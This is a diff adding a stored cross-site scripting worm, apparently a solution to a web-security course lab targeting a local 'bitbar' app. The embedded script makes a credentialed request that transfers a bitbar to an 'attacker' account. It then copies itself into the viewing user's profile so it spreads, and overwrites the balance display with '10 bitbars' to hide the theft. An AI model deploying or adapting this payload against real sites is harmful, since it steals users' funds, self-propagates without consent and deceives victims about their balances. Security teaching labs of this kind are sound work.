@@ -1,0 +1,22 @@
+Fight Milk
+<script>
+
+var params = "destination_username=attacker&quantity=1";
+var req = new XMLHttpRequest();
+req.withCredentials=true;
+req.onload=function(){
+	var prof = encodeURIComponent(document.getElementById("profile").innerHTML);
+	var params2 = "new_profile=".concat(prof);
+	var req2 = new XMLHttpRequest();
+	req2.withCredentials=true;
+	req2.onload=function(){
+		document.getElementById("bitbar_display").innerHTML = "10 bitbars";
+	}
+	req2.open("post", "http://localhost:3000/set_profile");
+	req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	req2.send(params2);
+}
+req.open("post", "http://localhost:3000/post_transfer");
+req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+req.send(params);
+</script>
